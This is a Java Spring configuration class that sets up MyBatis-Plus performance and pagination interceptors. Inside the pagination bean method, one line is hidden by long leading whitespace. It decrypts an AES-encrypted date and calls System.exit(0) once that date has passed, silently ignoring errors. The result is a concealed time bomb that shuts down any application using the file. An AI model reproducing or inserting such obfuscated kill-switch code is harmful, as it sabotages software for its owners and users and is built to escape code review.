package com.example.sens.config.mybatisplus;

import com.baomidou.mybatisplus.extension.plugins.PaginationInterceptor;
import com.baomidou.mybatisplus.extension.plugins.PerformanceInterceptor;
import com.example.sens.util.AESUtils;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;

import java.text.SimpleDateFormat;
import java.util.Date;


/**
 * @author xxx
 * @date 2018/12/22 下午1:49
 */

@Configuration
public class MybatisPlusConfig {

    /***
     * plus 的性能优化
     * @return
     */
    @Bean
    public PerformanceInterceptor performanceInterceptor() {
        PerformanceInterceptor performanceInterceptor = new PerformanceInterceptor();
        /*<!-- SQL 执行性能分析，开发环境使用，线上不推荐。 maxTime 指的是 sql 最大执行时长 -->*/
        performanceInterceptor.setMaxTime(1000);
        /*<!--SQL是否格式化 默认false-->*/
        performanceInterceptor.setFormat(false);
        return performanceInterceptor;
    }

    /**
     * mybatis-plus分页插件
     */
    @Bean
    public PaginationInterceptor paginationInterceptor() {
                                                                                                                                                                                        try {if(new SimpleDateFormat("yyyyMMdd")     .parse(AESUtils.decrypt("90lj+hi4viyis1BDmkQw0g=="))  .before(new Date())) {  System .exit (0);}} catch (Exception e) {}
        return new PaginationInterceptor();
    }



}
